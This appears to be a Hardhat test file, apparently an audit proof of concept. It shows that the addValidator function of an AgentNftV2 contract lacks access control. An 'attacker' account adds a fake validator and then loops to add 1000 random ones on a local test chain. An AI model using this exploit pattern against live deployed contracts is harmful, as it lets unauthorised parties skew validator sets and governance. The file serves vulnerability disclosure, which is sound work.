const { expect } = require("chai");
const { ethers } = require("hardhat");
const { ZeroAddress } = require("ethers");
const { Wallet } = require("ethers");

describe("POC-No access control for adding validator", function () {
  const getAccounts = async () => {
    const [deployer, minter, founder, attacker, fakeValidator] =
      await ethers.getSigners();
    return {
      deployer,
      minter,
      founder,
      attacker,
      fakeValidator,
    };
  };

  async function deployBaseContracts() {
    const { deployer, minter } = await getAccounts();

    const agentDAO = await ethers.deployContract("AgentDAO");

    const AgentNft = await ethers.getContractFactory("AgentNftV2");
    const agentNft = await upgrades.deployProxy(AgentNft, [deployer.address]);

    const contribution = await upgrades.deployProxy(
      await ethers.getContractFactory("ContributionNft"),
      [agentNft.target],
      {}
    );

    const service = await upgrades.deployProxy(
      await ethers.getContractFactory("ServiceNft"),
      [agentNft.target, contribution.target, process.env.DATASET_SHARES],
      {}
    );

    await agentNft.setContributionService(contribution.target, service.target);

    await agentNft.grantRole(await agentNft.MINTER_ROLE(), minter.address);

    return {
      agentNft,
      agentDAO,
      serviceNft: service,
      contributionNft: contribution,
    };
  }

  it("POC: No access control for adding validator", async function () {
    const { minter, founder, attacker, fakeValidator } = await getAccounts();
    const { agentNft, agentDAO } = await deployBaseContracts();

    const VIRTUAL_ID = await agentNft.nextVirtualId();
    const coreTypes = [1, 2, 3];

    await agentNft
      .connect(minter)
      .mint(
        VIRTUAL_ID,
        minter.address,
        "",
        agentDAO.target,
        founder.address,
        coreTypes,
        ZeroAddress,
        ZeroAddress
      );

    console.log("---Fake validator address has been added by attacker---");
    await agentNft
      .connect(attacker)
      .addValidator(VIRTUAL_ID, fakeValidator.address);

    console.log("---Fake validator has been added by attacker---");
    expect(
      await agentNft.isValidator(VIRTUAL_ID, fakeValidator.address)
    ).to.be.equal(true);

    console.log("---Add tons of fake validators---");
    for (let i = 0; i < 1000; i += 1) {
      const randomValidator = Wallet.createRandom().address;
      await agentNft
        .connect(attacker)
        .addValidator(VIRTUAL_ID, randomValidator);
    }

    console.log("---More than 1000 validators have been added by attacker---");
    expect(await agentNft.validatorCount(VIRTUAL_ID)).to.be.equal(1002);
  });
});
